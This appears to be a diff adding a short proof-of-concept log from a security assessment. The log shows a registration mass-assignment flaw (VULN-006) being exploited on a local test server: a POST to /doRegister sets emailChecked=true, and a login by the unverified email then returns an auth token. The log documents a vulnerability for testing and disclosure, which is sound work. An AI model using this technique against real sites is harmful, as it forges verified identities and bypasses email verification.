@@ -1,0 +1,8 @@
+[INFO] VULN-006: registration mass-assignment (email/emailChecked) -> forged verified email
+[SETUP] target account name=poc_mltw2sc1  email=exploit_mltw2sc1@example.invalid (never verified)
+[STEP] POST /doRegister  name=poc_mltw2sc1 email=exploit_mltw2sc1@example.invalid emailChecked=true
+[INFO] register redirect: Location: http://localhost:20000/;jsessionid=AD4479E35B30B419270D398CF2639AFD
+[STEP] GET /api/login?username=<email>&encoding=sha512  (findByEmail requires emailChecked=true)
+[INFO] /api/login response: {"authToken":"8b669b2b-dd39-4eaa-a63e-ab76be7ddf98","expiryDate":1792466063212,"user":{"attribute":null,"contentPermissions":0,"cover":null,"deptId":null,"email":"exploit_mltw2sc1@example.invalid","em
+[OK] exploit confirmed — logged in by an unverified email marked emailChecked=true
+     (forged verified-email identity for exploit_mltw2sc1@example.invalid without any mailbox proof)
